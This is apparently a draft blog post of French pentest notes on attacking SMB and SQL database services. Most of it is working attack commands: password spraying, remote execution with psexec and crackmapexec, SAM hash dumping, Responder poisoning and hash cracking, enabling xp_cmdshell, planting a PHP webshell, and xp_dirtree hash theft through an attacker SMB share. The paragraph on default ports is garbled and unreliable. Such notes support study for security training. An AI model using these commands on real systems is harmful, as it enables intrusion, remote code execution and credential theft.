---
title: "Attaquer mes services"
date: 2026-03-06T10:00:00+02:00
draft: true
tags: ["pentest", "Active Directory", "PowerView", "reconnaissance", "CRTP", "red team"]
categories: ["Red Team", "pentester"]
summary: ""
showToc: true
tocOpen: true
---
# Attacking SMB
Le protocole SMB (Server Message Block) est un protocole de communication conçu pour permettre le partage d'accès aux fichiers et aux imprimantes entre les nœuds d'un réseau.

Énumération

```
sudo nmap 10.129.14.128 -sV -sC -p139,445
```

Partage de fichiers

```
smbclient -N -L //10.129.14.128
```

```
smbmap -H 10.129.14.128
```

Nous pouvons utiliser cet rpcclientoutil avec une session nulle pour énumérer un poste de travail ou un contrôleur de domaine.

```
rpcclient -U'%' 10.10.110.17
```

```
crackmapexec smb 10.10.110.17 -u /tmp/userlist.txt -p 'Company01!' --local-auth
```

Exécution de code à distance (RCE)

```
impacket-psexec administrator:'Password123!'@10.10.110.17
```


```
crackmapexec smb 10.10.110.17 -u Administrator -p 'Password123!' -x 'whoami' --exec-method smbexec
```

```
crackmapexec smb 10.10.110.0/24 -u administrator -p 'Password123!' --loggedon-users
```

Extraire les hachages de la base de données SAM

```
crackmapexec smb 10.10.110.17 -u administrator -p 'Password123!' --sam
```

Attaques par authentification forcée

```
responder -I <interface name>
```

```
hashcat -m 5600 hash.txt /usr/share/wordlists/rockyou.txt
```


# Attaquer les bases de données SQL


MySQL et Microsoft SQL Server MSSQL sont des systèmes de gestion de bases de données relationnelles qui stockent les données dans des tables, des colonnes et des lignes.

# Enumeration 

Par défaut, MSSQL utilise les ports 800 TCP/1433et 800 UDP/1434, et MySQL utilise le port TCP/3306800. Toutefois, lorsque MSSQL fonctionne en mode « caché », il utilise le TCP/2433port 800.
Nous pouvons utiliser l'option "-sC" pour énumerer les services de base de données sur le systeme 

```bash
nmap -Pn -sV -sC -p 1433 <IP>
```

# Mécanismes d'authentification

SQL Server prend en charge deux modes d'authentification : le mode d'authentification Windows et le mode mixte.
MySQL prend également en charge différentes méthodes d'authentification , telles que le nom d'utilisateur et le mot de passe, ainsi que l'authentification Windows (un plugin est requis).

# Attaques spécifiques au protocole

## Lire/Modifier la base de données

### mysql - Connexion au serveur SQL

```bash
mysql -u username -ppassword -h IP
```

### Sqlcmd - connexion au serveur SQl
	sqlcmd -S SRVMSSQL -U username -P 'password' -y 30 -Y 30

Si notre cible MSSQL est Linux, nous pouvons utiliser sqsh comme alternative à sqlcmd
	sqsh -S ip -U username -P 'Password' -h
Nous pouvons aussi utiliser l'outil d'impacket mssqlclient.py
	mssqlclient.py -p 1433 name@ip

Lors de l'utilisation de l'authentification Windows, il est nécessaire de spécifier le nom de domaine ou le nom d'hôte de la machine cible
	sqsh -S ip -U .\\name -P password -h
	
# Exécuter les commandes
MSSQL possède une procédure stockée etendue appeléé xp_cmdshell qui permet d'exécuter des commandes système via SQL.
Pour exécuter des commandes utilisant la syntaxe SQL sur MSSQL, utilisez :
	> xp_cmdshell 'whoami'
	> Go
	
si 'xp_cmdshell' n'est pas activée , nous pouvons l'activiter , si nous disposons des privilèges appropiés , a l'aide de la commande suivante 

	EXECUTE sp_configure 'show advanced options', 1
	
	RECONFIGURE 
	GO
	
	EXECUTE sp_configure 'xp_cmdshell',1
	
	RECONFIGURE
	GO
	
Il existe d'autres méthodes pour exécuter des commandes, comme l'ajout de procédures stockées étendues , d'assemblys CLR , de tâches de l'Agent SQL Server et de scripts externes 
Cependant, outre ces méthodes, des fonctionnalités supplémentaires sont disponibles, telles que la xp_regwritecommande permettant d'élever les privilèges en créant de nouvelles entrées dans le registre Windows. 

MySQLSQL prend en charge les fonctions définies par l'utilisateur, ce qui permet d'exécuter du code C/C++ comme une fonction au sein de SQL.
# Écrire des fichiers locaux
	SELECT "<?php echo shell_exec($_GET['c']);?>" INTO OUTFILE '/var/www/html/webshell.php';

Pour écrire des fichiers à l'aide de MSSQL, nous devons activer les procédures d'automatisation Ole , ce qui nécessite des privilèges d'administrateur, puis exécuter certaines procédures stockées pour créer le fichier :
	> sp_configure 'show advanced options',1
	> GO
	> RECONFIGURE
	> GO
	> sp_configure 'Ole Automation Procedures', 1	
	> GO
	> RECONFIGURE
	> GO
	
## MSSQL - Créer un fichier

```bash
	> DECLARE @OLE INT
	> DECLARE @FileID INT
	> EXECUTE sp_OACreate 'Scripting.FileSystemObject', @OLE OUT
	> EXECUTE sp_OAMethod @OLE, 'OpenTextFile', @FileID OUT, 'c:\inetpub\wwwroot\webshell.php', 8, 1
	> EXECUTE sp_OAMethod @FileID, 'WriteLine', Null, '<?php echo shell_exec($_GET["c"]);?>'
	> EXECUTE sp_OADestroy @FileID
	> EXECUTE sp_OADestroy @OLE
	> GO	
	
```
## Lire les fichiers locaux
	> SELECT * FROM OPENROWSET(BULK N'C:/Windows/System32/drivers/etc/hosts', SINGLE_CLOB) AS Contents 
	> GO

### Capture du hachage du service MSSQL
l est également possible de voler le hachage du compte de service MSSQL à l'aide de procédures stockées xp_subdirsnon xp_dirtreedocumentées, qui utilisent le protocole SMB pour récupérer la liste des sous-répertoires d'un répertoire parent spécifié

Pour que cela fonctionne, nous devons d'abord démarrer Responder ou impacket-smbserver et exécuter l'une des requêtes SQL suivantes :
#### Vol de hachage XP_DIRTREE
	> EXEC master..xp_dirtree '\\10.10.110.17\share\'
	> GO
	
faut lancer responder pour recuperer le Hash 
 sudo responder -I tun0 
 


	
	
https://learn.microsoft.com/en-us/sql/connect/ado-net/sql/authentication-sql-server?view=sql-server-ver17
https://learn.microsoft.com/en-us/sql/relational-databases/extended-stored-procedures-programming/database-engine-extended-stored-procedures-programming?view=sql-server-ver15
https://github.com/mysqludf/lib_mysqludf_sys
https://www.samba.org/samba/docs/current/man-html/rpcclient.1.html
https://www.willhackforsushi.com/sec504/SMB-Access-from-Linux.pdf
